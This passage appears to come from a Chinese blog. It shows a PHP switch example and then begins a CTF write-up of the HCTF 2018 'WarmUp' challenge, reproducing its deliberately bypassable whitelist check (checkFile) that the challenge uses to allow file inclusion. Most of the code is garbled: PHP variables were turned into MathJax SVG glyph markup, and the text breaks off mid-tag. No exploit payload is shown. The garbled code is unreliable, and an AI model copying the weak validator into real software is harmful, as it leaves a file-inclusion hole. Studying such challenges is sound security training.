<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">&lt;?php<br>switch (n)<br>&#123;<br>case label1:<br>    如果 n&#x3D;label1，此处代码将执行;<br>    break;<br>case label2:<br>    如果 n&#x3D;label2，此处代码将执行;<br>    break;<br>default:<br>    如果 n 既不等于 label1 也不等于 label2，此处代码将执行;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210227182855761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/08/04/Buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>这是一道关于代码审计的题<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627198003837-a7ebfeb9-f44e-4ccc-b1ca-96ce5f953a99.png#align=left&display=inline&height=189&margin=%5Bobject%20Object%5D&name=image.png&originHeight=377&originWidth=1265&size=52770&status=done&style=none&width=632.5" alt="image.png"><br>通过查看源代码发现了source.php的源文件<br>进入查看</p>
<p>`&lt;?php<br>    highlight_file(__FILE__);<br>    class emmm<br>    {<br>        public static function checkFile(&amp;$page)<br>        {<br>            $whitelist = [“source”=&gt;”source.php”,”hint”=&gt;”hint.php”];<br>            if (! isset(<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="16.536ex" height="2.843ex" style="vertical-align: -0.838ex; margin-left: -0.089ex;" viewBox="-38.5 -863.1 7119.5 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">page)&nbsp;||&nbsp;!is_string(</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMAIN-29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path>
<path stroke-width="1" id="E1-MJMAIN-7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path>
<path stroke-width="1" id="E1-MJMAIN-21" d="M78 661Q78 682 96 699T138 716T180 700T199 661Q199 654 179 432T158 206Q156 198 139 198Q121 198 119 206Q118 209 98 431T78 661ZM79 61Q79 89 97 105T141 121Q164 119 181 104T198 61Q198 31 181 16T139 1Q114 1 97 16T79 61Z"></path>
<path stroke-width="1" id="E1-MJMATHI-69" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path>
<path stroke-width="1" id="E1-MJMATHI-74" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path>
<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMAIN-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="503" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="1033" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1513" y="0"></use>
 <use xlink:href="#E1-MJMAIN-29" x="1980" y="0"></use>
 <use xlink:href="#E1-MJMAIN-7C" x="2369" y="0"></use>
 <use xlink:href="#E1-MJMAIN-7C" x="2648" y="0"></use>
 <use xlink:href="#E1-MJMAIN-21" x="2926" y="0"></use>
 <use xlink:href="#E1-MJMATHI-69" x="3205" y="0"></use>
<g transform="translate(3550,0)">
 <use xlink:href="#E1-MJMATHI-73" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-73" x="663" y="-213"></use>
</g>
 <use xlink:href="#E1-MJMATHI-74" x="4451" y="0"></use>
 <use xlink:href="#E1-MJMATHI-72" x="4813" y="0"></use>
 <use xlink:href="#E1-MJMATHI-69" x="5264" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6E" x="5610" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="6210" y="0"></use>
 <use xlink:href="#E1-MJMAIN-28" x="6691" y="0"></use>
</g>
</svg>page)) {<br>                echo “you can’t see it”;<br>                return false;<br>            }</p>
<p>            if (in_array(<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.335ex" height="2.009ex" style="vertical-align: -0.671ex; margin-left: -0.089ex;" viewBox="-38.5 -576.1 2297 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">page,&nbsp;</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="503" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="1033" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1513" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2C" x="1980" y="0"></use>
</g>
</svg>whitelist)) {<br>                return true;<br>            }</p>
<p>            $_page = mb_substr(<br>                $page,<br>                0,<br>                mb_strpos($page . ‘?’, ‘?’)<br>            );<br>            if (in_array(<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.199ex" height="2.343ex" style="vertical-align: -1.005ex; margin-left: -0.063ex;" viewBox="-27.2 -576.1 2238.3 1008.6" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">_page,&nbsp;</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-70" x="0" y="-213"></use>
 <use xlink:href="#E1-MJMATHI-61" x="456" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="985" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1466" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2C" x="1932" y="0"></use>
</g>
</svg>whitelist)) {<br>                return true;<br>            }</p>
<p>            <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="18.36ex" height="3.009ex" style="vertical-align: -1.005ex; margin-left: -0.063ex;" viewBox="-27.2 -863.1 7904.8 1295.7" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">_page&nbsp;=&nbsp;urldecode(</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
<path stroke-width="1" id="E1-MJMATHI-75" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6C" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path>
<path stroke-width="1" id="E1-MJMATHI-64" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path>
<path stroke-width="1" id="E1-MJMATHI-63" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6F" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path>
<path stroke-width="1" id="E1-MJMAIN-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-70" x="0" y="-213"></use>
 <use xlink:href="#E1-MJMATHI-61" x="456" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="985" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1466" y="0"></use>
 <use xlink:href="#E1-MJMAIN-3D" x="2210" y="0"></use>
 <use xlink:href="#E1-MJMATHI-75" x="3266" y="0"></use>
 <use xlink:href="#E1-MJMATHI-72" x="3839" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6C" x="4290" y="0"></use>
 <use xlink:href="#E1-MJMATHI-64" x="4589" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="5112" y="0"></use>
 <use xlink:href="#E1-MJMATHI-63" x="5579" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6F" x="6012" y="0"></use>
 <use xlink:href="#E1-MJMATHI-64" x="6498" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="7021" y="0"></use>
 <use xlink:href="#E1-MJMAIN-28" x="7488" y="0"></use>
</g>
</svg>page);<br>            $_page = mb_substr(<br>                $_page,<br>                0,<br>                mb_strpos($_page . ‘?’, ‘?’)<br>            );<br>            if (in_array(<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.199ex" height="2.343ex" style="vertical-align: -1.005ex; margin-left: -0.063ex;" viewBox="-27.2 -576.1 2238.3 1008.6" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">_page,&nbsp;</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path>
